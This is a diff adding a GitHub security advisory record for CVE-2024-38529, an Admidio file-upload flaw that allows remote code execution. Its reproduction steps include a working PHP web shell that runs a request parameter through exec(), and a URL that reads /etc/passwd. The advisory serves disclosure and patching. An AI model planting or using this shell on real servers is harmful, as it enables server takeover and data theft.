@@ -1,0 +1,69 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-g872-jwwr-vggm",
+  "modified": "2024-07-29T16:32:32Z",
+  "published": "2024-07-29T16:32:32Z",
+  "aliases": [
+    "CVE-2024-38529"
+  ],
+  "summary": "Admidio Vulnerable to RCE via Arbitrary File Upload in Message Attachment",
+  "details": "### Description:\nRemote Code Execution Vulnerability has been identified in the Message module of the Admidio Application, where it is possible to upload a PHP file in the attachment. The uploaded file can be accessed publicly through the URL `{admidio_base_url}/adm_my_files/messages_attachments/{file_name}`.\n\nThe vulnerability is caused due to the lack of file extension verification, allowing malicious files to be uploaded to the server and public availability of the uploaded file.\n\nAn attacker can upload a PHP web shell that executes OS commands on the server, compromising the application server.\n\nNote: I am using the docker-compose.yaml file from https://github.com/Admidio/admidio/blob/master/README-Docker.md#docker-compose-usage official documentation.\n\n### Impact:\nAn attacker can exploit this flaw to upload a PHP web shell, which can be used to execute arbitrary commands on the server. This can lead to a complete compromise of the application server, allowing the attacker to:\n\n- Execute arbitrary code or commands.\n- Access, modify, or delete sensitive data.\n- Install malicious software or scripts.\n- Gain further access to internal networks.\n- Disrupt services and applications hosted on the server.\n\n### Recommendation:\n\n- Implement strict file extension verification to ensure that only allowed file types (e.g., images, documents) can be uploaded.\n- Reject any file upload with disallowed or suspicious extensions such as .php, .phtml, .exe, etc.\n\n### Steps to Reproduce:\n1. As a member user, go to write an email message.\n2. Upload a PHP file in the Attachment, containing the following content:\n```\n<?php\n$command = isset($_GET['command']) ? $_GET['command'] : '';\n$output = [];\n$return_var = 0;\nexec($command, $output, $return_var);\necho '<h1>Exploiting RCE</h1>';\necho 'Command: '.$command;\necho '\\n<pre>';\necho implode(\"\\n\", $output);\necho '</pre>';\n?>\n```\n3. Send the email.\n4. In the message history go to the sent message.\n5. Download the file, to get the uploaded file name.\n6. Go to the following URL: \n`{admidio_base_url}/adm_my_files/messages_attachments/{file_name}?command=cat+/etc/passwd`\n7. The server's passwd file would be returned in the response.\n\n### Proof Of Concept:\n\n![image](https://github.com/Admidio/admidio/assets/59286712/51b524de-ec51-4875-80e9-e2037da9c573)\n\n_Figure 1: Code of messages_send.php, not having file extension verification._\n\n![image](https://github.com/Admidio/admidio/assets/59286712/74b47e6d-e2e9-4535-82e3-d6ad2f677361)\n\n_Figure 2: Uploading Webshell as attachment._\n\n![image](https://github.com/Admidio/admidio/assets/59286712/abea26eb-b36f-46db-9e3a-8a4ba82d9740)\n\n_Figure 3: Download the uploaded file to get the uploaded file name._\n\n![image](https://github.com/Admidio/admidio/assets/59286712/fbb14aae-d5c6-454b-bafa-8d03d6d8a208)\n\n_Figure 4: Uploaded File name._\n\n![image](https://github.com/Admidio/admidio/assets/59286712/f8436248-1768-4714-ad2d-87f157145c61)\n\n_Figure 5: RCE via web shell._\n\n![image](https://github.com/Admidio/admidio/assets/59286712/edc5b992-227f-43f9-bef9-87959766a63c)\n\n_Figure 6: RCE via Webshell._",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "admidio/admidio"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.3.10"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Admidio/admidio/security/advisories/GHSA-g872-jwwr-vggm"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-38529"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Admidio/admidio/commit/3b1cc1cda05747edebe15f2825b79bc5a673d94c"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Admidio/admidio"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-434"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-07-29T16:32:32Z",
+    "nvd_published_at": "2024-07-29T15:15:10Z"
+  }
+}
